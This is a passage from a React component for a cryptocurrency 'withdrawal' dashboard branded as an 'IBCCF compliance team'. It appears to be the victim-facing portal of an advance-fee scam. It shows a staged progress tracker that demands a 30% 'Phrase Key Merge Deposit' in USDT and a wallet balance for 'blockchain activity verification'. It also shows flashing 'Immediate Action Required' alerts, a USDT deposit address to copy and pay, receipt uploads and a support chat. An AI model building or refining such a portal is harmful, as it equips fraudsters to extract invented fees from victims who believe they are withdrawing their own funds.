                                      <div className={`flex items-center gap-3 w-full ${isFirst ? 'pl-4' : 'pl-5'} pr-4`}>
                                        <span className="text-xl flex-shrink-0">{stage.icon}</span>
                                        <div className="flex flex-col min-w-0 flex-1">
                                          <span className="text-xs font-bold text-white leading-tight">
                                            {stage.label}
                                          </span>
                                          <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-white/20 text-white animate-pulse w-fit mt-1">
                                            In Progress
                                          </span>
                                        </div>
                                      </div>
                                    )}
                                  </div>
                                </motion.div>
                              );
                            })}
                          </div>
                          <p className="text-xs text-slate-500 mt-4 text-center">Your withdrawal is being processed</p>
                        </div>
                        
                        {/* Current Stage Detail Card */}
                        <div className="px-6">
                        {(() => {
                          const currentStageData = stages.find(s => s.id === currentStage);
                          if (!currentStageData) return null;
                          return (
                            <motion.div
                              initial={{ opacity: 0, y: 10 }}
                              animate={{ opacity: 1, y: 0 }}
                              className="p-4 bg-gradient-to-r from-blue-50 to-indigo-50 border-2 border-blue-300 rounded-xl"
                            >
                              <div className="flex items-center gap-3">
                                <div className="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center text-2xl animate-pulse">
                                  {currentStageData.icon}
                                </div>
                                <div>
                                  <p className="text-xs text-blue-600 font-medium">Currently Processing</p>
                                  <h4 className="font-bold text-blue-800 text-lg">{currentStageData.label}</h4>
                                  <p className="text-blue-600 text-sm mt-0.5">{currentStageData.description}</p>
                                </div>
                              </div>
                            </motion.div>
                          );
                        })()}
                        </div>
                        
                        {/* Phrase Key Merge Deposit Notice */}
                        {currentStage === 7 && currentCase?.phraseKeyMergeDeposit && (
                          <div className="px-6">
                          <motion.div
                            initial={{ opacity: 0, scale: 0.95 }}
                            animate={{ opacity: 1, scale: 1 }}
                            className="p-4 bg-gradient-to-r from-purple-50 to-indigo-50 border-2 border-purple-300 rounded-xl"
                          >
                            <div className="flex items-start gap-3">
                              <div className="w-12 h-12 bg-purple-500 rounded-full flex items-center justify-center flex-shrink-0">
                                <Key className="w-6 h-6 text-white" />
                              </div>
                              <div>
                                <h4 className="font-bold text-purple-800 text-lg">Phrase Key Merge Deposit Required</h4>
                                <p className="text-purple-700 text-sm mt-1">
                                  A 30% merge deposit is required to complete the phrase key verification process.
                                </p>
                                <div className="mt-3 p-3 bg-white rounded-lg border border-purple-200">
                                  <p className="text-sm text-slate-600">Required Amount:</p>
                                  <p className="text-2xl font-bold text-purple-600">{currentCase.phraseKeyMergeDeposit} USDT</p>
                                </div>
                              </div>
                            </div>
                          </motion.div>
                          </div>
                        )}
                        
                        {/* Blockchain Activity Verification Notice */}
                        {currentStage === 10 && currentCase?.activityWalletRequirement && (
                          <div className="px-6">
                          <motion.div
                            initial={{ opacity: 0, scale: 0.95 }}
                            animate={{ opacity: 1, scale: 1 }}
                            className="p-4 bg-gradient-to-r from-amber-50 to-orange-50 border-2 border-amber-300 rounded-xl"
                          >
                            <div className="flex items-start gap-3">
                              <div className="w-12 h-12 bg-amber-500 rounded-full flex items-center justify-center flex-shrink-0">
                                <Wallet className="w-6 h-6 text-white" />
                              </div>
                              <div>
                                <h4 className="font-bold text-amber-800 text-lg">Blockchain Activity Verification</h4>
                                <p className="text-amber-700 text-sm mt-1">
                                  Please maintain the required USDT balance in your receiving wallet address for activity verification.
                                </p>
                                <div className="mt-3 p-3 bg-white rounded-lg border border-amber-200">
                                  <p className="text-sm text-slate-600">Required Wallet Balance:</p>
                                  <p className="text-2xl font-bold text-amber-600">{currentCase.activityWalletRequirement} USDT</p>
                                </div>
                              </div>
                            </div>
                          </motion.div>
                          </div>
                        )}
                      </div>
                    );
                  })()}
                </CardContent>
              </Card>
            </motion.div>
          )}

          {/* Requirement Alert with Animation */}
          {(currentCase?.hasRequirements || hasUrgentMessages) && (
            <motion.div 
              initial={{ opacity: 0, scale: 0.95 }} 
              animate={{ opacity: 1, scale: 1 }}
              className="mb-8 p-5 bg-gradient-to-r from-red-50 to-orange-50 border-2 border-red-200 rounded-xl flex items-center gap-4 shadow-lg shadow-red-100/50"
            >
              <motion.div 
                animate={{ rotate: [0, -10, 10, -10, 0] }}
                transition={{ repeat: Infinity, duration: 2, ease: "easeInOut" }}
                className="w-14 h-14 bg-gradient-to-br from-red-500 to-orange-500 rounded-full flex items-center justify-center flex-shrink-0 shadow-lg"
              >
                <AlertTriangle className="w-7 h-7 text-white" />
              </motion.div>
              <div className="flex-1">
                <h3 className="font-bold text-red-900 text-lg">Immediate Action Required</h3>
                <p className="text-red-700">You have pending requirements from IBCCF compliance team. Please review and respond promptly.</p>
              </div>
              <Button 
                className="bg-red-600 hover:bg-red-700 shadow-lg"
                onClick={() => setViewState('messages')}
              >
                View Now
              </Button>
            </motion.div>
          )}

          {/* Main Grid */}
          <div className="grid lg:grid-cols-3 gap-6">
            {/* Required Actions Card */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('messages')} data-testid="card-required-actions">
                <CardHeader className="bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-t-lg">
                  <div className="flex items-center justify-between">
                    <CardTitle className="flex items-center gap-2">
                      <Bell className="w-5 h-5" />
                      Required Actions
                    </CardTitle>
                    {unreadAdminMessages > 0 && (
                      <Badge className="bg-red-500 text-white animate-pulse">{unreadAdminMessages}</Badge>
                    )}
                  </div>
                </CardHeader>
                <CardContent className="pt-6">
                  <div className="space-y-3">
                    <div className="flex items-center justify-between text-sm">
                      <span className="flex items-center gap-2 text-red-600">
                        <AlertTriangle className="w-4 h-4" /> Urgent
                      </span>
                      <Badge variant={urgentMessages.length > 0 ? "destructive" : "secondary"}>{urgentMessages.length}</Badge>
                    </div>
                    <div className="flex items-center justify-between text-sm">
                      <span className="flex items-center gap-2 text-amber-600">
                        <Clock className="w-4 h-4" /> Processing
                      </span>
                      <Badge variant="outline">{processingMessages.length}</Badge>
                    </div>
                    <div className="flex items-center justify-between text-sm">
                      <span className="flex items-center gap-2 text-green-600">
                        <CheckCircle className="w-4 h-4" /> Resolved
                      </span>
                      <Badge variant="outline">{resolvedMessages.length}</Badge>
                    </div>
                  </div>
                  <Button className="w-full mt-6" variant="outline">View Messages</Button>
                </CardContent>
              </Card>
            </motion.div>

            {/* Withdrawal Letter Card */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}>
              <Card 
                className={`h-full transition-shadow border-2 border-transparent ${
                  currentCase?.letterSent 
                    ? 'hover:shadow-lg cursor-pointer hover:border-primary/20' 
                    : 'opacity-90'
                }`} 
                onClick={() => setViewState('letter')} 
                data-testid="card-withdrawal-letter"
              >
                <CardHeader className={`text-white rounded-t-lg ${
                  currentCase?.letterSent 
                    ? 'bg-gradient-to-r from-emerald-500 to-emerald-600' 
                    : 'bg-gradient-to-r from-slate-400 to-slate-500'
                }`}>
                  <CardTitle className="flex items-center gap-2">
                    <FileText className="w-5 h-5" />
                    Withdrawal Letter
                    {!currentCase?.letterSent && (
                      <Badge className="bg-amber-500 text-white ml-2">Pending</Badge>
                    )}
                  </CardTitle>
                </CardHeader>
                <CardContent className="pt-6">
                  {currentCase?.letterSent ? (
                    <>
                      <p className="text-slate-600 text-sm mb-4">
                        Review your withdrawal options and select your preferred method.
                      </p>
                      <div className="space-y-2 text-sm">
                        <div className="flex justify-between">
                          <span className="text-slate-500">Status</span>
                          <Badge variant={submissions.length > 0 ? 'default' : 'outline'} className={submissions.length > 0 ? 'bg-green-600' : ''}>
                            {submissions.length > 0 ? 'Submitted' : 'Ready to Review'}
                          </Badge>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-slate-500">Submissions</span>
                          <span className="font-semibold">{submissions.length}</span>
                        </div>
                      </div>
                      <Button className="w-full mt-6" variant="outline">View Letter</Button>
                    </>
                  ) : (
                    <>
                      <div className="flex items-center gap-3 mb-4 text-amber-600 bg-amber-50 rounded-lg p-3">
                        <Clock className="w-5 h-5" />
                        <p className="text-sm font-medium">
                          Your letter is being prepared by the compliance team
                        </p>
                      </div>
                      <p className="text-slate-500 text-sm">
                        You will be notified when your personalized withdrawal letter is ready for review.
                      </p>
                      <Button className="w-full mt-6" variant="outline" disabled>
                        Awaiting Letter
                      </Button>
                    </>
                  )}
                </CardContent>
              </Card>
            </motion.div>

            {/* Profile Card */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}>
              <Card className="h-full hover:shadow-lg transition-shadow border-2 border-transparent hover:border-primary/20">
                <CardHeader className="bg-gradient-to-r from-purple-500 to-purple-600 text-white rounded-t-lg">
                  <CardTitle className="flex items-center gap-2">
                    <User className="w-5 h-5" />
                    Profile Information
                  </CardTitle>
                </CardHeader>
                <CardContent className="pt-6">
                  <div className="space-y-3 text-sm">
                    <div className="flex justify-between items-center">
                      <span className="text-slate-500">Name</span>
                      <span className="font-semibold">{currentCase?.userName}</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-slate-500">Email</span>
                      <span className="font-semibold text-xs">{currentCase?.userEmail}</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-slate-500">VIP Status</span>
                      <Badge className="bg-amber-100 text-amber-700">{currentCase?.vipStatus || 'Standard'}</Badge>
                    </div>
                    {currentCase?.depositAddress && (
                      <div className="pt-2 border-t">
                        <span className="text-slate-500 text-xs block mb-1">Deposit Address</span>
                        <code className="text-xs bg-slate-100 p-2 rounded block break-all">{currentCase.depositAddress}</code>
                      </div>
                    )}
                  </div>
                  {currentCase?.profileRedirectUrl && (
                    <Button 
                      className="w-full mt-6" 
                      variant="outline"
                      onClick={() => window.open(currentCase.profileRedirectUrl, '_blank')}
                    >
                      <ExternalLink className="w-4 h-4 mr-2" />
                      Access my profile account
                    </Button>
                  )}
                </CardContent>
              </Card>
            </motion.div>

            {/* Deposit Section Card */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.4 }}>
              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('deposit')} data-testid="card-deposit">
                <CardHeader className="bg-gradient-to-r from-amber-500 to-amber-600 text-white rounded-t-lg">
                  <CardTitle className="flex items-center gap-2">
                    <Wallet className="w-5 h-5" />
                    Deposit & Receipts
                  </CardTitle>
                </CardHeader>
                <CardContent className="pt-6">
                  <p className="text-slate-600 text-sm mb-4">
                    Upload your deposit receipts and track their status.
                  </p>
                  <div className="space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span className="text-slate-500">Receipts Uploaded</span>
                      <span className="font-semibold">{depositReceipts.length}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Pending Review</span>
                      <span className="font-semibold">{depositReceipts.filter(r => r.status === 'pending').length}</span>
                    </div>
                  </div>
                  <Button className="w-full mt-6" variant="outline">Manage Deposits</Button>
                </CardContent>
              </Card>
            </motion.div>

            {/* Submission History Card */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.5 }}>
              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('submissions')} data-testid="card-history">
                <CardHeader className="bg-gradient-to-r from-slate-600 to-slate-700 text-white rounded-t-lg">
                  <CardTitle className="flex items-center gap-2">
                    <History className="w-5 h-5" />
                    Submission History
                  </CardTitle>
                </CardHeader>
                <CardContent className="pt-6">
                  <p className="text-slate-600 text-sm mb-4">
                    View all your previous submissions and their status.
                  </p>
                  <div className="text-sm">
                    <div className="flex justify-between">
                      <span className="text-slate-500">Total Submissions</span>
                      <span className="font-semibold">{submissions.length}</span>
                    </div>
                  </div>
                  <Button className="w-full mt-6" variant="outline">View History</Button>
                </CardContent>
              </Card>
            </motion.div>

            {/* Activity Timeline Card */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.6 }}>
              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('timeline')} data-testid="card-timeline">
                <CardHeader className="bg-gradient-to-r from-indigo-500 to-indigo-600 text-white rounded-t-lg">
                  <CardTitle className="flex items-center gap-2">
                    <Clock className="w-5 h-5" />
                    Activity Timeline
                  </CardTitle>
                </CardHeader>
                <CardContent className="pt-6">
                  <p className="text-slate-600 text-sm mb-4">
                    View your complete account activity history.
                  </p>
                  <div className="space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span className="text-slate-500">Recent Activities</span>
                      <span className="font-semibold">{submissions.length + depositReceipts.length + adminMessages.length}</span>
                    </div>
                  </div>
                  <Button className="w-full mt-6" variant="outline">View Timeline</Button>
                </CardContent>
              </Card>
            </motion.div>

            {/* IBCCF Support Card */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.7 }}>
              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setIsChatOpen(true)} data-testid="card-support">
                <CardHeader className="bg-gradient-to-r from-cyan-500 to-cyan-600 text-white rounded-t-lg">
                  <div className="flex items-center justify-between">
                    <CardTitle className="flex items-center gap-2">
                      <MessageCircle className="w-5 h-5" />
                      IBCCF Support
                    </CardTitle>
                    {unreadCount > 0 && (
                      <Badge className="bg-red-500 text-white">{unreadCount}</Badge>
                    )}
                  </div>
                </CardHeader>
                <CardContent className="pt-6">
                  <p className="text-slate-600 text-sm mb-4">
                    Chat with IBCCF support for assistance with your account.
                  </p>
                  <Button className="w-full mt-6" variant="outline">
                    <MessageCircle className="w-4 h-4 mr-2" />
                    Open Chat
                  </Button>
                </CardContent>
              </Card>
            </motion.div>

            {/* Feedback Card */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.8 }}>
              <Card className={`h-full transition-shadow border-2 border-transparent ${hasSubmittedFeedback ? 'opacity-75' : 'hover:shadow-lg cursor-pointer hover:border-primary/20'}`} onClick={() => !hasSubmittedFeedback && setIsFeedbackOpen(true)} data-testid="card-feedback">
                <CardHeader className="bg-gradient-to-r from-pink-500 to-rose-500 text-white rounded-t-lg">
                  <CardTitle className="flex items-center gap-2">
                    <span className="text-xl">⭐</span>
                    Feedback
                  </CardTitle>
                </CardHeader>
                <CardContent className="pt-6">
                  {hasSubmittedFeedback ? (
                    <div className="text-center text-green-600">
                      <CheckCircle className="w-8 h-8 mx-auto mb-2" />
                      <p className="text-sm font-medium">Thank you for your feedback!</p>
                    </div>
                  ) : (
                    <>
                      <p className="text-slate-600 text-sm mb-4">
                        Help us improve by sharing your experience.
                      </p>
                      <Button className="w-full mt-6" variant="outline">
                        Leave Feedback
                      </Button>
                    </>
                  )}
                </CardContent>
              </Card>
            </motion.div>
          </div>
        </main>

        {/* Floating Chat Button */}
        <motion.button
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          whileHover={{ scale: 1.1 }}
          className="fixed bottom-6 right-6 w-16 h-16 bg-primary text-white rounded-full shadow-2xl flex items-center justify-center z-50"
          onClick={() => setIsChatOpen(true)}
          data-testid="button-chat-float"
        >
          <MessageCircle className="w-7 h-7" />
          {unreadCount > 0 && (
            <span className="absolute -top-1 -right-1 w-6 h-6 bg-red-500 rounded-full text-xs flex items-center justify-center font-bold">
              {unreadCount}
            </span>
          )}
        </motion.button>

        {/* Chat Dialog */}
        <AnimatePresence>
          {isChatOpen && currentCase && (
            <motion.div
              initial={{ opacity: 0, y: 100 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: 100 }}
              className="fixed bottom-6 right-6 z-50 w-80 sm:w-96 h-[500px] bg-white rounded-lg shadow-2xl border border-slate-200 flex flex-col overflow-hidden"
              data-testid="chat-panel"
            >
              <div className="bg-gradient-to-r from-blue-600 to-blue-700 text-white px-4 py-3 flex justify-between items-center">
                <div className="flex items-center gap-3">
                  <div className="relative">
                    <MessageCircle className="h-5 w-5" />
                    <span className="absolute -bottom-0.5 -right-0.5 w-2 h-2 bg-green-400 rounded-full border border-blue-600"></span>
                  </div>
                  <div>
                    <span className="font-semibold block">IBCCF Support</span>
                    <span className="text-xs text-blue-200">Online • Typically replies in minutes</span>
                  </div>
                </div>
                <Button
                  variant="ghost"
                  size="sm"
                  className="h-8 w-8 p-0 text-white hover:bg-blue-700"
                  onClick={() => setIsChatOpen(false)}
                  data-testid="button-close-chat"
                >
                  <X className="h-4 w-4" />
                </Button>
              </div>
              
              <div ref={chatScrollRef} className="flex-1 overflow-y-auto p-4 space-y-3 bg-slate-50">
                {chatMessages.length === 0 ? (
                  <div className="text-center text-slate-500 mt-8">
                    <div className="w-16 h-16 bg-blue-100 rounded-full mx-auto flex items-center justify-center mb-4">
                      <MessageCircle className="h-8 w-8 text-blue-500" />
                    </div>
                    <p className="font-medium text-slate-700 mb-1">Welcome to IBCCF Support</p>
                    <p className="text-sm text-slate-500">How can we help you today?</p>
                  </div>
                ) : (
                  chatMessages.map((msg) => (
                    <div key={msg.id} className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
                      {msg.sender === 'admin' && (
                        <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center mr-2 flex-shrink-0">
                          <span className="text-blue-600 font-bold text-xs">IBCCF</span>
                        </div>
                      )}
                      <div
                        className={`max-w-[75%] px-4 py-2.5 rounded-2xl shadow-sm ${
                          msg.sender === 'user'
                            ? 'bg-blue-600 text-white rounded-br-md'
                            : 'bg-white text-slate-800 border border-slate-100 rounded-bl-md'
                        }`}
                      >
                        <p className="text-sm whitespace-pre-wrap leading-relaxed">{msg.message}</p>
                      </div>
                    </div>
                  ))
                )}
              </div>
              
              <div className="p-3 border-t border-slate-200 bg-white">
                <div className="flex gap-2 items-end">
                  <div className="flex-1">
                    <Input
                      placeholder="Type your message..."
                      value={newMessage}
                      onChange={(e) => setNewMessage(e.target.value)}
                      onKeyDown={(e) => e.key === 'Enter' && !e.shiftKey && sendMessage()}
                      disabled={isSendingMessage}
                      className="bg-slate-50 border-slate-200 focus:border-blue-500"
                      data-testid="input-chat-message"
                    />
                  </div>
                  <Button
                    onClick={sendMessage}
                    disabled={!newMessage.trim() || isSendingMessage}
                    size="sm"
                    className="h-10 w-10 p-0 bg-blue-600 hover:bg-blue-700 rounded-full"
                    data-testid="button-send-message"
                  >
                    <Send className="h-4 w-4" />
                  </Button>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Feedback Dialog */}
        <Dialog open={isFeedbackOpen} onOpenChange={setIsFeedbackOpen}>
          <DialogContent className="sm:max-w-md" data-testid="dialog-feedback">
            <DialogHeader>
              <DialogTitle className="flex items-center gap-2">
                <span className="text-2xl">⭐</span>
                Share Your Feedback
              </DialogTitle>
              <DialogDescription>
                Help us improve your experience by rating our service and leaving comments.
              </DialogDescription>
            </DialogHeader>
            <div className="py-4 space-y-6">
              {/* Star Rating */}
              <div>
                <label className="text-sm font-medium mb-3 block">How would you rate your experience?</label>
                <div className="flex gap-2 justify-center">
                  {[1, 2, 3, 4, 5].map((star) => (
                    <button
                      key={star}
                      type="button"
                      className={`text-4xl transition-transform hover:scale-110 ${
                        feedbackRating >= star ? 'text-yellow-400' : 'text-slate-300'
                      }`}
                      onClick={() => setFeedbackRating(star)}
                      data-testid={`button-star-${star}`}
                    >
                      ★
                    </button>
                  ))}
                </div>
                {feedbackRating > 0 && (
                  <p className="text-center text-sm text-slate-500 mt-2">
                    {feedbackRating === 1 && "Poor"}
                    {feedbackRating === 2 && "Fair"}
                    {feedbackRating === 3 && "Good"}
                    {feedbackRating === 4 && "Very Good"}
                    {feedbackRating === 5 && "Excellent"}
                  </p>
                )}
              </div>
              
              {/* Comment */}
              <div>
                <label className="text-sm font-medium mb-2 block">Additional comments (optional)</label>
                <Textarea
                  placeholder="Tell us more about your experience..."
                  value={feedbackComment}
                  onChange={(e) => setFeedbackComment(e.target.value)}
                  rows={4}
                  className="resize-none"
                  data-testid="input-feedback-comment"
                />
              </div>
            </div>
            <DialogFooter>
              <Button variant="outline" onClick={() => setIsFeedbackOpen(false)}>Cancel</Button>
              <Button 
                onClick={submitFeedback} 
                disabled={feedbackRating === 0 || isSubmittingFeedback}
                className="bg-gradient-to-r from-pink-500 to-rose-500 hover:from-pink-600 hover:to-rose-600"
                data-testid="button-submit-feedback"
              >
                {isSubmittingFeedback ? "Submitting..." : "Submit Feedback"}
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      </div>
    );
  }

  // MESSAGES VIEW
  if (viewState === 'messages') {
    const urgentMessages = adminMessages.filter(m => m.category === 'urgent');
    const processingMessages = adminMessages.filter(m => m.category === 'processing');
    const resolvedMessages = adminMessages.filter(m => m.category === 'resolved');

    return (
      <div className="min-h-screen bg-slate-50">
        <nav className="bg-primary text-white shadow-lg">
          <div className="max-w-5xl mx-auto px-4 py-4 flex items-center gap-4">
            <Button variant="ghost" size="icon" className="text-white" onClick={() => setViewState('dashboard')}>
              <ArrowLeft className="w-5 h-5" />
            </Button>
            <div>
              <h1 className="font-bold">Required Actions</h1>
              <p className="text-xs text-blue-200">View messages from IBCCF</p>
            </div>
          </div>
        </nav>

        <main className="max-w-5xl mx-auto px-4 py-8">
          {/* Urgent Messages */}
          {urgentMessages.length > 0 && (
            <div className="mb-8">
              <h2 className="text-lg font-bold text-red-600 flex items-center gap-2 mb-4">
                <AlertTriangle className="w-5 h-5 animate-pulse" />
                Urgent
              </h2>
              <div className="space-y-4">
                {urgentMessages.map(msg => (
                  <Card 
                    key={msg.id} 
                    className={`border-2 ${!msg.isRead ? 'border-red-400 bg-red-50' : 'border-red-200'} cursor-pointer hover:shadow-lg transition-all`}
                    onClick={() => { setSelectedMessage(msg); if (!msg.isRead) markAdminMessageAsRead(msg.id); }}
                  >
                    <CardHeader className="pb-2">
                      <div className="flex items-center justify-between">
                        <CardTitle className="text-red-900 flex items-center gap-2">
                          {!msg.isRead && <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse" />}
                          {msg.title}
                        </CardTitle>
                        <span className="text-xs text-slate-500">{new Date(msg.createdAt).toLocaleDateString()}</span>
                      </div>
                    </CardHeader>
                    <CardContent>
                      <p className="text-sm text-slate-600 line-clamp-2">{msg.body}</p>
                    </CardContent>
                  </Card>
                ))}
              </div>
            </div>
          )}

          {/* Processing Messages */}
          {processingMessages.length > 0 && (
            <div className="mb-8">
              <h2 className="text-lg font-bold text-amber-600 flex items-center gap-2 mb-4">
                <Clock className="w-5 h-5" />
                Processing
              </h2>
              <div className="space-y-4">
                {processingMessages.map(msg => (
                  <Card 
                    key={msg.id} 
                    className={`border-2 ${!msg.isRead ? 'border-amber-400 bg-amber-50' : 'border-amber-200'} cursor-pointer hover:shadow-lg transition-all`}
                    onClick={() => { setSelectedMessage(msg); if (!msg.isRead) markAdminMessageAsRead(msg.id); }}
                  >
                    <CardHeader className="pb-2">
                      <div className="flex items-center justify-between">
                        <CardTitle className="text-amber-900 flex items-center gap-2">
                          {!msg.isRead && <div className="w-2 h-2 bg-amber-500 rounded-full" />}
                          {msg.title}
                        </CardTitle>
                        <span className="text-xs text-slate-500">{new Date(msg.createdAt).toLocaleDateString()}</span>
                      </div>
                    </CardHeader>
                    <CardContent>
                      <p className="text-sm text-slate-600 line-clamp-2">{msg.body}</p>
                    </CardContent>
                  </Card>
                ))}
              </div>
            </div>
          )}

          {/* Resolved Messages */}
          {resolvedMessages.length > 0 && (
            <div className="mb-8">
              <h2 className="text-lg font-bold text-green-600 flex items-center gap-2 mb-4">
                <CheckCircle className="w-5 h-5" />
                Resolved
              </h2>
              <div className="space-y-4">
                {resolvedMessages.map(msg => (
                  <Card 
                    key={msg.id} 
                    className="border-2 border-green-200 cursor-pointer hover:shadow-lg transition-all"
                    onClick={() => { setSelectedMessage(msg); if (!msg.isRead) markAdminMessageAsRead(msg.id); }}
                  >
                    <CardHeader className="pb-2">
                      <div className="flex items-center justify-between">
                        <CardTitle className="text-green-900">{msg.title}</CardTitle>
                        <span className="text-xs text-slate-500">{new Date(msg.createdAt).toLocaleDateString()}</span>
                      </div>
                    </CardHeader>
                    <CardContent>
                      <p className="text-sm text-slate-600 line-clamp-2">{msg.body}</p>
                    </CardContent>
                  </Card>
                ))}
              </div>
            </div>
          )}

          {adminMessages.length === 0 && (
            <div className="text-center py-16">
              <MessageCircle className="w-16 h-16 mx-auto text-slate-300 mb-4" />
              <h3 className="text-xl font-semibold text-slate-600">No Messages</h3>
              <p className="text-slate-500">You have no messages from IBCCF at this time.</p>
            </div>
          )}
        </main>

        {/* Message Detail Dialog */}
        <Dialog open={!!selectedMessage} onOpenChange={() => setSelectedMessage(null)}>
          <DialogContent className="max-w-lg">
            <DialogHeader>
              <DialogTitle className="flex items-center gap-2">
                {selectedMessage?.category === 'urgent' && <AlertTriangle className="w-5 h-5 text-red-500" />}
                {selectedMessage?.category === 'processing' && <Clock className="w-5 h-5 text-amber-500" />}
                {selectedMessage?.category === 'resolved' && <CheckCircle className="w-5 h-5 text-green-500" />}
                {selectedMessage?.title}
              </DialogTitle>
              <DialogDescription>
                {selectedMessage && new Date(selectedMessage.createdAt).toLocaleString()}
              </DialogDescription>
            </DialogHeader>
            <div className="py-4">
              <p className="text-slate-700 whitespace-pre-line">{selectedMessage?.body}</p>
            </div>
            <DialogFooter>
              <Button onClick={() => setSelectedMessage(null)}>Close</Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      </div>
    );
  }

  // DEPOSIT VIEW
  if (viewState === 'deposit') {
    return (
      <div className="min-h-screen bg-slate-50">
        <nav className="bg-primary text-white shadow-lg">
          <div className="max-w-5xl mx-auto px-4 py-4 flex items-center gap-4">
            <Button variant="ghost" size="icon" className="text-white" onClick={() => setViewState('dashboard')}>
              <ArrowLeft className="w-5 h-5" />
            </Button>
            <div>
              <h1 className="font-bold">Deposit & Receipts</h1>
              <p className="text-xs text-blue-200">Upload and track your deposit receipts</p>
            </div>
          </div>
        </nav>

        <main className="max-w-5xl mx-auto px-4 py-8">
          {/* Deposit Address Info */}
          {currentCase?.depositAddress && (
            <Card className="mb-8 border-2 border-amber-200 bg-amber-50">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-amber-900">
                  <Wallet className="w-5 h-5" />
                  Your USDT Deposit Address (TRC20)
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="flex items-center gap-2 p-4 bg-white rounded border">
                  <code className="flex-1 text-sm break-all font-mono font-bold text-slate-900">
                    {currentCase.depositAddress}
                  </code>
                  <Button
                    variant="outline"
                    size="sm"
                    className="flex-shrink-0"
                    onClick={() => {
                      navigator.clipboard.writeText(currentCase.depositAddress || '');
                      toast({ title: "Copied!", description: "Deposit address copied to clipboard" });
                    }}
                    data-testid="button-copy-address"
                  >
                    <Copy className="w-4 h-4" />
                  </Button>
                </div>
                <div className="mt-4 p-3 bg-amber-100 rounded-lg">
                  <p className="text-sm text-amber-800 font-medium mb-2">Important Instructions:</p>
                  <ul className="text-xs text-amber-700 space-y-1 list-disc list-inside">
                    <li>Only send USDT on the TRC20 network</li>
                    <li>After completing your deposit, upload the receipt below</li>
                    <li>Keep your transaction hash for reference</li>
                  </ul>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Upload Section */}
          <Card className="mb-8">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Upload className="w-5 h-5" />
                Upload Deposit Receipt
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                <Textarea
                  placeholder="Add notes about your deposit (optional)..."
                  value={receiptNotes}
                  onChange={(e) => setReceiptNotes(e.target.value)}
                  className="resize-none"
                  rows={3}
                />
                <input
                  ref={fileInputRef}
                  type="file"
                  accept="image/*"
                  onChange={handleFileUpload}
                  className="hidden"
                />
                <Button 
                  className="w-full" 
                  onClick={() => fileInputRef.current?.click()}
                  disabled={uploadingReceipt}
                >
                  {uploadingReceipt ? (
                    <>Uploading...</>
                  ) : (
                    <>
                      <Image className="w-4 h-4 mr-2" />
                      Select Image to Upload
                    </>
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>

          {/* Receipt History */}
          <h3 className="text-lg font-bold text-slate-900 mb-4">Uploaded Receipts</h3>
          {depositReceipts.length === 0 ? (
            <div className="text-center py-12 bg-white rounded-lg border">
              <Image className="w-12 h-12 mx-auto text-slate-300 mb-3" />
              <p className="text-slate-500">No receipts uploaded yet</p>
            </div>
          ) : (
            <div className="space-y-4">
              {depositReceipts.map(receipt => (
                <Card key={receipt.id}>
                  <CardContent className="py-4 flex items-center justify-between">
                    <div className="flex items-center gap-4">
                      {receipt.imageData && (
                        <img src={receipt.imageData} alt="Receipt" className="w-16 h-16 object-cover rounded" />
                      )}
                      <div>
                        <p className="font-semibold">{receipt.fileName || 'Receipt'}</p>
                        <p className="text-sm text-slate-500">{new Date(receipt.uploadedAt).toLocaleString()}</p>
                        {receipt.notes && <p className="text-sm text-slate-600 mt-1">{receipt.notes}</p>}
                      </div>
                    </div>
                    <Badge variant={
                      receipt.status === 'approved' ? 'default' :
                      receipt.status === 'rejected' ? 'destructive' :
                      'secondary'
                    }>
                      {receipt.status}
                    </Badge>
                  </CardContent>
                </Card>
              ))}
            </div>
          )}

          {/* Ask Support */}
          <Card className="mt-8">
            <CardContent className="py-6 text-center">
              <p className="text-slate-600 mb-4">Need help with your deposit?</p>
              <Button onClick={() => setIsChatOpen(true)}>
                <MessageCircle className="w-4 h-4 mr-2" />
